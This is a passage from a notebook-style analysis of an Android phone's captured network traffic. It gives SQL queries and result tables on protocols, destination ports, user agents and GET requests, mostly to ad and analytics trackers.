      <td>                                           sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:pkix1implicit:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:pkix1implicit:x509ce:x509ce:pkix1explicit:x509ce:x509ce:x509ce:pkcs-1</td>
    </tr>
    <tr>
      <th>65</th>
      <td>      5</td>
      <td>                                                                                                                                                                     sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkix1explicit:pkix1implicit:pkix1implicit:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1explicit:pkcs-1:ssl</td>
    </tr>
    <tr>
      <th>66</th>
      <td>      5</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          sll:ipv6</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><h1 id="used-destination-ports">Used destination ports</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p_ports = pdsql.read_frame(&#34;&#34;&#34; 
    SELECT COUNT(c.dstport), c.dstport
    FROM connection AS c
    JOIN dns AS d ON c.dst = d.dns_response
    GROUP by c.dstport
    ORDER by 1 DESC
&#34;&#34;&#34;, con)
#print(p1.head(100).to_string())
p_ports.head(100)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>COUNT(c.dstport)</th>
      <th>dstport</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> 18673312</td>
      <td>  443</td>
    </tr>
    <tr>
      <th>1</th>
      <td>  1879360</td>
      <td>   80</td>
    </tr>
    <tr>
      <th>2</th>
      <td>    61568</td>
      <td> 5228</td>
    </tr>
    <tr>
      <th>3</th>
      <td>     9760</td>
      <td>  993</td>
    </tr>
    <tr>
      <th>4</th>
      <td>     7712</td>
      <td> 5222</td>
    </tr>
    <tr>
      <th>5</th>
      <td>     4512</td>
      <td> 8253</td>
    </tr>
    <tr>
      <th>6</th>
      <td>     2368</td>
      <td>  995</td>
    </tr>
    <tr>
      <th>7</th>
      <td>      144</td>
      <td> 7276</td>
    </tr>
    <tr>
      <th>8</th>
      <td>      112</td>
      <td> 7275</td>
    </tr>
    <tr>
      <th>9</th>
      <td>        0</td>
      <td>  NaN</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><h1 id="http-connections">HTTP Connections</h1>
<h2 id="http-methods">HTTP Methods</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p_http_methods = pdsql.read_frame(&#34;&#34;&#34; 
    SELECT COUNT(request_method), request_method
    FROM http
    GROUP by request_method
    ORDER by 1 DESC
&#34;&#34;&#34;, con)
#print(p1.head(100).to_string())
p_http_methods.head(100)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>COUNT(request_method)</th>
      <th>request_method</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> 1345</td>
      <td>  GET</td>
    </tr>
    <tr>
      <th>1</th>
      <td>    8</td>
      <td> POST</td>
    </tr>
  </tbody>
</table>
</div>
<h2 id="user-agents">User Agents</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p_user_agents = pdsql.read_frame(&#34;&#34;&#34; 
    SELECT COUNT(user_agent), user_agent
    FROM http
    GROUP by user_agent
    ORDER by 1 DESC
&#34;&#34;&#34;, con)
#print(p1.head(100).to_string())
p_user_agents.head(100)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>COUNT(user_agent)</th>
      <th>user_agent</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td> 2388</td>
      <td>                                                                                                                                                                  null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)</td>
    </tr>
    <tr>
      <th>1 </th>
      <td> 1088</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>2 </th>
      <td>  500</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>3 </th>
      <td>  368</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>4 </th>
      <td>  328</td>
      <td>                                                                                                                                                                                                              Ultimate DayDream</td>
    </tr>
    <tr>
      <th>5 </th>
      <td>  212</td>
      <td>                                                                                                                                                       Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0</td>
    </tr>
    <tr>
      <th>6 </th>
      <td>  148</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>7 </th>
      <td>  112</td>
      <td>                                                                                                                                                                                                     Spotify/70400610 (6; 2; 7)</td>
    </tr>
    <tr>
      <th>8 </th>
      <td>   72</td>
      <td>                                                                                                                                                                  Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>9 </th>
      <td>   60</td>
      <td>                                                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v6.4.1)</td>
    </tr>
    <tr>
      <th>10</th>
      <td>   28</td>
      <td>                                                                                                                                                                 android-async-http/1.3.1 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>11</th>
      <td>   24</td>
      <td> Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100/4.3.1(18)/samsung/GT-N7000</td>
    </tr>
    <tr>
      <th>12</th>
      <td>   20</td>
      <td>                                                                                                                                  com.google.android.youtube/5.3.32(Linux; U; Android 4.3.1; de_DE; GT-N7000 Build/JLS36I) gzip</td>
    </tr>
    <tr>
      <th>13</th>
      <td>    8</td>
      <td>                                                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v4.1.1)</td>
    </tr>
    <tr>
      <th>14</th>
      <td>    8</td>
      <td>                                                                                                                                                                 android-async-http/1.4.1 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>15</th>
      <td>    8</td>
      <td>                                                                                                                                       com.google.android.youtube/5.3.32(Linux; U; Android 4.3.1; de_DE; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>16</th>
      <td>    4</td>
      <td>                                                                                                                                                                                                                        Android</td>
    </tr>
    <tr>
      <th>17</th>
      <td>    4</td>
      <td>                                                                                                                                                  GoogleAnalytics/1.4.2 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>18</th>
      <td>    4</td>
      <td>                                                                                                                                                                 android-async-http/1.4.3 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>19</th>
      <td>    4</td>
      <td>                                                                                                                                                                                          stagefright/1.2 (Linux;Android 4.3.1)</td>
    </tr>
    <tr>
      <th>20</th>
      <td>    0</td>
      <td>                                                                                                                                                                                                                           None</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><h2 id="get-requests">GET Requests</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">p3 = pdsql.read_frame(&#34;&#34;&#34; 
    SELECT h.frame_number, h.ip_dst, d.dns_query, h.request_method, h.request_uri, h.user_agent FROM http AS  h
    JOIN dns AS d ON h.ip_dst = d.dns_response
    WHERE lower(h.request_method) == &#39;get&#39; AND
        -- Filter all rubish
        (h.request_uri NOT LIKE &#39;%.gif&#39;  AND 
         h.request_uri NOT LIKE &#39;%.jpg&#39;  AND
         h.request_uri NOT LIKE &#39;%.jpeg&#39; AND
         h.request_uri NOT LIKE &#39;%.png&#39;  AND
         h.request_uri NOT LIKE &#39;%.gif&#39;  AND
         h.request_uri NOT LIKE &#39;%.css&#39;  AND 
         h.request_uri NOT LIKE &#39;%.html&#39; AND
         h.request_uri NOT LIKE &#39;%.js&#39;) 
    AND
        (d.dns_query NOT LIKE &#39;%amazon%&#39;   AND
         d.dns_query NOT LIKE &#39;%fahrinfo%&#39; AND
         d.dns_query NOT LIKE &#39;%faz.net%&#39;  AND
         d.dns_query NOT LIKE &#39;%heute.de%&#39; AND
         d.dns_query NOT LIKE &#39;%twitter%&#39;  AND
         d.dns_query NOT LIKE &#39;%sueddeutsche%&#39;)
    
    GROUP by h.request_uri
    ORDER by d.dns_query
&#34;&#34;&#34;, con)
p3.head(500)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>frame_number</th>
      <th>ip_dst</th>
      <th>dns_query</th>
      <th>request_method</th>
      <th>request_uri</th>
      <th>user_agent</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0  </th>
      <td>  95383</td>
      <td>    217.79.188.8</td>
      <td>                   adfarm1.adition.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /js?wp_id=2501167</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>1  </th>
      <td>  39785</td>
      <td>   217.163.21.41</td>
      <td>                         ads.yahoo.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /cms/v1?esig=1~b9bada6fffbf45c1ffda7783879fb5715486894a&amp;nwid=10000922750&amp;sigv=1</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>2  </th>
      <td>  44272</td>
      <td>      5.10.81.84</td>
      <td>                adx.fe02-sl.manage.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                        /2/win?_bi=4bq4p7Cn9VXzc3XTEz1wocSUpKU%3D&amp;_ei=10411&amp;_ecost1000000_adx=Utq7uQAM5S8K3tKEAABJJbJHrnHwdXabfQqUjg&amp;-mf=2&amp;-fi=86400&amp;age=0&amp;app=&amp;appi=&amp;appv=&amp;pt=app&amp;pi=com.iudesk.android.photo.editor&amp;p=com.iudesk.android.photo.editor&amp;zid=&amp;pcat=&amp;lat=&amp;lon=&amp;country=DEU&amp;gender=%3F&amp;isp=carrier&amp;netspd=dial-up&amp;model=gt-n7000&amp;os=Android&amp;osv=4.3.1&amp;region=&amp;zip=&amp;dma=0&amp;si=4&amp;_ua=Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.3.1%3B+de-de%3B+GT-N7000+Build%2FJLS36I%29+AppleWebKit%2F534.30+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Mobile+Safari%2F534.30+%28Mobile%3B+afma-sdk-a-v6.4.1%29%2Cgzip%28gfe%29&amp;_uh=xid%3ACAESEDLJ4tolP4xNFA9ZOWuBZNM&amp;idx=2&amp;ai=209646&amp;_bid=0.00117&amp;sub5=fe02-sl</td>
      <td>                                                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v6.4.1)</td>
    </tr>
    <tr>
      <th>3  </th>
      <td>  43930</td>
      <td>    5.153.15.196</td>
      <td>                adx.fe08-sl.manage.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                        /2/win?_bi=HOq1iXrqnKD4Wtb8FdrWjdqewso%3D&amp;_ei=10411&amp;_ecost1000000_adx=Utq7BgAGYa0K3sdHAAAWKarWI_oJGLrPHIcJKg&amp;-mf=2&amp;-fi=86400&amp;age=0&amp;app=&amp;appi=&amp;appv=&amp;pt=app&amp;pi=com.iudesk.android.photo.editor&amp;p=com.iudesk.android.photo.editor&amp;zid=&amp;pcat=&amp;lat=&amp;lon=&amp;country=DEU&amp;gender=%3F&amp;isp=carrier&amp;netspd=dial-up&amp;model=gt-n7000&amp;os=Android&amp;osv=4.3.1&amp;region=&amp;zip=&amp;dma=0&amp;si=4&amp;_ua=Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.3.1%3B+de-de%3B+GT-N7000+Build%2FJLS36I%29+AppleWebKit%2F534.30+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Mobile+Safari%2F534.30+%28Mobile%3B+afma-sdk-a-v6.4.1%29%2Cgzip%28gfe%29&amp;_uh=xid%3ACAESEDLJ4tolP4xNFA9ZOWuBZNM&amp;idx=1&amp;ai=209646&amp;_bid=0.00117&amp;sub5=fe08-sl</td>
      <td>                                                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v6.4.1)</td>
    </tr>
    <tr>
      <th>4  </th>
      <td>    130</td>
      <td> 173.194.116.169</td>
      <td>            android.clients.google.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           /generate_204</td>
      <td>                                                                                                                                                                  Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>5  </th>
      <td>  90548</td>
      <td>  91.215.101.182</td>
      <td>                    andropit.ivwbox.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           /cgi-bin/ivw/CP/forum;?r=&amp;d=59106.27518314868</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>6  </th>
      <td>  43440</td>
      <td>    37.58.73.181</td>
      <td>                 api.geo.kontagent.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /api/v1/0d868f5ce9434bdcafd869f2b11adae8/cpu/?os=android_18&amp;v_maj=4.4.2.254&amp;d=GT-N7000&amp;ts=1390065565&amp;s=218949477293337144&amp;c=o2+-+de&amp;kt_v=a1.3.1&amp;m=samsung</td>
      <td>                                                                                                                                                                 android-async-http/1.3.1 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>7  </th>
      <td>  43478</td>
      <td>    37.58.73.181</td>
      <td>                 api.geo.kontagent.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             /api/v1/0d868f5ce9434bdcafd869f2b11adae8/evt/?n=Keyboard_Average_Daily_Time&amp;ts=1390065565&amp;s=218949477293337144&amp;kt_v=a1.3.1&amp;st1=KeyboardUses</td>
      <td>                                                                                                                                                                 android-async-http/1.3.1 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>8  </th>
      <td>  43465</td>
      <td>    37.58.73.181</td>
      <td>                 api.geo.kontagent.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /api/v1/0d868f5ce9434bdcafd869f2b11adae8/evt/?n=Keyboard_Total_Daily_Time&amp;ts=1390065565&amp;s=218949477293337144&amp;kt_v=a1.3.1&amp;st1=KeyboardUses</td>
      <td>                                                                                                                                                                 android-async-http/1.3.1 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>9  </th>
      <td>  43453</td>
      <td>    37.58.73.181</td>
      <td>                 api.geo.kontagent.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /api/v1/0d868f5ce9434bdcafd869f2b11adae8/evt/?n=Keyboard_Total_Daily_Uses&amp;ts=1390065565&amp;s=218949477293337144&amp;kt_v=a1.3.1&amp;st1=KeyboardUses</td>
      <td>                                                                                                                                                                 android-async-http/1.3.1 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>10 </th>
      <td>  43488</td>
      <td>    37.58.73.181</td>
      <td>                 api.geo.kontagent.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /api/v1/0d868f5ce9434bdcafd869f2b11adae8/pgr/?ts=1390065565&amp;s=218949477293337144&amp;kt_v=a1.3.1</td>
      <td>                                                                                                                                                                 android-async-http/1.3.1 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>11 </th>
      <td>  43548</td>
      <td>    37.58.73.182</td>
      <td>                 api.geo.kontagent.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /api/v1/0d868f5ce9434bdcafd869f2b11adae8/pgr/?ts=1390065632&amp;s=218949477293337144&amp;kt_v=a1.3.1</td>
      <td>                                                                                                                                                                 android-async-http/1.3.1 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>12 </th>
      <td>  61181</td>
      <td>  54.228.232.253</td>
      <td>                        api.tunigo.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /v3/space/genres?order=desc&amp;field=releaseDate_tdt&amp;suppress404=1&amp;product=&amp;per_page=100&amp;page=0&amp;suppress_response_codes=1&amp;region=DE</td>
      <td>                                                                                                                                                                 android-async-http/1.4.1 (http://loopj.com/android-async-http)</td>
    </tr>
    <tr>
      <th>13 </th>
      <td> 117707</td>
      <td>    78.31.12.120</td>
      <td>                 apresolve.spotify.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /</td>
      <td>                                                                                                                                                                                                     Spotify/70400610 (6; 2; 7)</td>
    </tr>
    <tr>
      <th>14 </th>
      <td>  39796</td>
      <td>    2.23.186.235</td>
      <td>                     bh.contextweb.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        /bh/rtset?pid=557477&amp;ev=&amp;rurl=http%3A%2F%2Fs.amazon-adsystem.com%2Fecm3%3Fid%3D%25%25ENCRYPTED_VGUID%25%25%26ex%3Dpulsepoint.com</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>15 </th>
      <td>  39784</td>
      <td>   173.241.240.6</td>
      <td>                         bid.openx.net</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /cm?pid=e818ca1e-0c23-caa8-0dd3-096b0ada08b7&amp;dst=http%3A%2F%2Fs.amazon-adsystem.com%2Fecm3%3Fex%3Dopenx.com%26id%3D</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>16 </th>
      <td>  34169</td>
      <td>   54.230.94.185</td>
      <td>                     cdn.flipboard.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /flipmag?url=http%3A%2F%2Fcdn.flipboard.com%2Fstern.de%2Finlineaml_3Dtrue%2F26e36cfec35abad0c372f74d1c472f84912677b0%2F849604d1e7bde34b05ed7967d066a6ccdcdb400e%2Farticle.html&amp;campaignTarget=flipboard%2Fmix%252F30924883&amp;partner=rss-stern&amp;tml=templates%2Fiphone%2Fgeneric-9690bc.html&amp;section=flipboard%2Fmix%252F30924883&amp;fallbackTml=templates%2Fiphone%2Fgeneric-9690bc.html&amp;formFactor=phone</td>
      <td> Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100/4.3.1(18)/samsung/GT-N7000</td>
    </tr>
    <tr>
      <th>17 </th>
      <td>  89725</td>
      <td>  74.125.128.120</td>
      <td>                       csi.gstatic.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /csi?v=3&amp;s=gmob&amp;action=&amp;rt=crf.1146,cri.3167</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>18 </th>
      <td>  89618</td>
      <td>  74.125.128.120</td>
      <td>                       csi.gstatic.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              /csi?v=3&amp;s=gmob&amp;action=&amp;rt=crf.12,cri.1029</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>19 </th>
      <td>  20874</td>
      <td>    23.21.95.178</td>
      <td>                     d.shareaholic.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /dough/1.0/mixer.gif?p_name=AN&amp;p_id=7789992519211014773</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>20 </th>
      <td>  20818</td>
      <td>    23.21.95.178</td>
      <td>                     d.shareaholic.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /dough/1.0/oven/?referrer=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fintelcrawler.com%252Fabout%252Fpress07&amp;platform=website</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>21 </th>
      <td>  90562</td>
      <td>   91.215.103.65</td>
      <td>                            de.ioam.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /tx.io?st=andropit&amp;cp=forum&amp;pt=CP&amp;rf=&amp;r2=&amp;ur=www.androidpit.de&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0001&amp;vr=303&amp;id=2gf46s&amp;lt=1390123647701&amp;ev=&amp;cs=eytiao&amp;mo=1</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>22 </th>
      <td> 136930</td>
      <td>   91.215.103.65</td>
      <td>                            de.ioam.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /tx.io?st=mobfaz&amp;cp=222F000006E6&amp;sv=mo&amp;co=kommentar&amp;pt=CP&amp;rf=&amp;r2=&amp;ur=m.faz.net&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0001&amp;vr=303&amp;id=y6dim4&amp;lt=1390147720004&amp;ev=&amp;cs=o2c483&amp;mo=1</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>23 </th>
      <td>  12723</td>
      <td>   91.215.103.65</td>
      <td>                            de.ioam.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /tx.io?st=mobfaz&amp;cp=222F000006E7&amp;sv=mo&amp;co=kommentar&amp;pt=CP&amp;rf=&amp;r2=&amp;ur=m.faz.net&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0004&amp;vr=303&amp;id=vngwhf&amp;lt=1390051123113&amp;ev=&amp;cs=aooae9&amp;mo=1</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>24 </th>
      <td>  11760</td>
      <td>   91.215.103.65</td>
      <td>                            de.ioam.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 /tx.io?st=mobheute&amp;cp=%2FZH%2Fheutede&amp;co=%2Fbeitrag%2FBlitzeinschlag%3A.Christus-Statue.verliert.Finger%2F31536732&amp;pt=CP&amp;rf=&amp;r2=&amp;ur=m.heute.de&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0007&amp;vr=303&amp;id=vngwhf&amp;lt=1390051093712&amp;ev=&amp;cs=dbhkky&amp;mo=1</td>
